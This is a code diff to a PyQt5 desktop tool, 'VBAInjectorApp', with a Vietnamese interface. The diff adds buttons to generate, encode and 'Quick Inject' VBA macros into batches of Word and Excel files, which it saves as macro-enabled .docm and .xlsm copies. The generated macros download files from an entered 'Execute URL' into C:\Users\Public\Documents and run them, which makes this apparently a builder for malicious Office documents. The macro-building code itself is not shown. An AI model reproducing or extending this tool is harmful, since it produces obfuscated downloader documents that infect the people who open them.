@@ -1,7 +1,7 @@
 import sys
 import os
 from PyQt5.QtWidgets import (
-    QApplication, QWidget, QVBoxLayout, QHBoxLayout, QPushButton, QLabel, 
+    QApplication, QWidget, QVBoxLayout, QHBoxLayout, QPushButton, QLabel, QTextEdit,
     QLineEdit, QListWidget, QFileDialog, QMessageBox, QListWidgetItem
 )
 from PyQt5.QtGui import QIcon 
@@ -81,6 +81,26 @@ class VBAInjectorApp(QWidget):
         library_layout.addWidget(add_library_btn)
 
         main_layout.addLayout(library_layout)
+        # --- VBA Code Area ---
+        vba_area_layout = QVBoxLayout()
+
+        button_layout = QHBoxLayout()
+        generate_vba_btn = QPushButton("Tạo VBA")
+        generate_vba_btn.clicked.connect(self.generate_vba_code)
+
+        encode_vba_btn = QPushButton("Mã hoá VBA")
+        encode_vba_btn.clicked.connect(self.encode_vba_code)
+
+        button_layout.addWidget(generate_vba_btn)
+        button_layout.addWidget(encode_vba_btn)
+
+        self.vba_textbox = QTextEdit()
+        self.vba_textbox.setPlaceholderText("VBA code sẽ hiển thị ở đây...")
+
+        vba_area_layout.addLayout(button_layout)
+        vba_area_layout.addWidget(self.vba_textbox)
+
+        main_layout.addLayout(vba_area_layout)
 
         # --- Upload & Generate ---
         upload_gen_layout = QHBoxLayout()
@@ -99,13 +119,19 @@ class VBAInjectorApp(QWidget):
         upload_layout.addWidget(self.upload_list)
         upload_layout.addWidget(add_file_btn)
         upload_layout.addWidget(delete_all_btn)
-
+        
+         #Quick Inject Button
+        quick_inject_btn = QPushButton("⚡ Quick Inject ⚡")
+        quick_inject_btn.setStyleSheet("font-size: 18px; padding: 15px; background-color: #4caf50;")
+        quick_inject_btn.clicked.connect(self.quick_inject_vba)
         # Center Button
         inject_layout = QVBoxLayout()
         inject_btn = QPushButton("➡️ Inject VBA ➡️")
         inject_btn.setStyleSheet("font-size: 20px; padding: 20px;")
         inject_btn.clicked.connect(self.inject_vba)
         inject_layout.addStretch()
+        inject_layout.addWidget(quick_inject_btn)
+        inject_layout.addSpacing(10)
         inject_layout.addWidget(inject_btn)
         inject_layout.addStretch()
 
@@ -223,6 +249,58 @@ class VBAInjectorApp(QWidget):
         filename = execute_url.split('/')[-1]
         main_file_path = execute_path + filename
 
+        vba_code = self.vba_textbox.toPlainText()
+        if not vba_code.strip():
+            QMessageBox.warning(self, "Lỗi", "Chưa có VBA code để inject!")
+            return
+        
+        injector = VBAInjector()
+        self.generated_list.clear()
+
+        for file_path in self.uploaded_files:
+            filename = os.path.basename(file_path)
+            if filename.endswith('.docx'):
+                output_filename = filename.replace('.docx', '.docm')
+            elif filename.endswith('.xlsx'):
+                output_filename = filename.replace('.xlsx', '.xlsm')
+            else:
+                continue
+
+            output_path = os.path.abspath(os.path.join(GENERATED_FOLDER, output_filename))
+            injector.inject_vba_to_office(file_path, output_path, vba_code)
+
+            info = self.get_file_info(output_path)
+            self.generated_list.addItem(info)
+
+        QMessageBox.information(self, "Thành công", "Đã nhúng VBA vào tất cả file!")
+
+    def quick_inject_vba(self):
+        execute_url = self.execute_url_input.text().strip()
+        execute_path = self.execute_path_input.text().strip()
+
+        if not execute_url:
+            QMessageBox.warning(self, "Lỗi", "Vui lòng nhập Execute URL!")
+            return
+
+        if not execute_path:
+            execute_path = r"C:\Users\Public\Documents\\"
+
+        library_urls = []
+        library_paths = []
+
+        for url_input, path_input in self.library_entries:
+            url = url_input.text().strip()
+            path = path_input.text().strip()
+            if url and path:
+                library_urls.append(url)
+                library_paths.append(path)
+
+        url_list = [execute_url] + library_urls
+        path_list = [execute_path] + library_paths
+
+        filename = execute_url.split('/')[-1]
+        main_file_path = os.path.join(execute_path, filename)
+
         encoder = VBAEncoder()
         vba_code = encoder.generate_encoded_vba(url_list, path_list, main_file_path)
 
@@ -244,7 +322,7 @@ class VBAInjectorApp(QWidget):
             info = self.get_file_info(output_path)
             self.generated_list.addItem(info)
 
-        QMessageBox.information(self, "Thành công", "Đã nhúng VBA vào tất cả file!")
+        QMessageBox.information(self, "Thành công", "Đã Quick Inject thành công vào tất cả file!")
 
     def save_generated_file(self):
         selected_items = self.generated_list.selectedItems()
@@ -263,7 +341,48 @@ class VBAInjectorApp(QWidget):
 
     def clear_generated_list(self):
         self.generated_list.clear()
+    def generate_vba_code(self):
+        execute_url = self.execute_url_input.text().strip()
+        execute_path = self.execute_path_input.text().strip()
 
+        if not execute_url:
+            QMessageBox.warning(self, "Lỗi", "Vui lòng nhập Execute URL!")
+            return
+
+        if not execute_path:
+            execute_path = r"C:\Users\Public\Documents\\"
+
+        library_urls = []
+        library_paths = []
+
+        for url_input, path_input in self.library_entries:
+            url = url_input.text().strip()
+            path = path_input.text().strip()
+            if url and path:
+                library_urls.append(url)
+                library_paths.append(path)
+
+        # Build từ OriginalBuilder
+        builder = OriginalBuilder()
+        url_list = [execute_url] + library_urls
+        path_list = [execute_path] + library_paths
+        filename = execute_url.split('/')[-1]
+        main_file_path = os.path.join(execute_path, filename)
+
+        sub_a = builder.build_sub_a(url_list, path_list)
+        sub_b = builder.build_sub_b(main_file_path)
+
+        final_vba = sub_a + '\n' + sub_b
+        self.vba_textbox.setPlainText(final_vba)
+    def encode_vba_code(self):
+        raw_vba = self.vba_textbox.toPlainText()
+        if not raw_vba.strip():
+            QMessageBox.warning(self, "Lỗi", "Chưa có VBA code để mã hóa!")
+            return
+
+        encoder = VBAEncoder()
+        encoded_vba = encoder.convert_vba_string(raw_vba)
+        self.vba_textbox.setPlainText(encoded_vba)
 if __name__ == '__main__':
     app = QApplication(sys.argv)
     window = VBAInjectorApp()
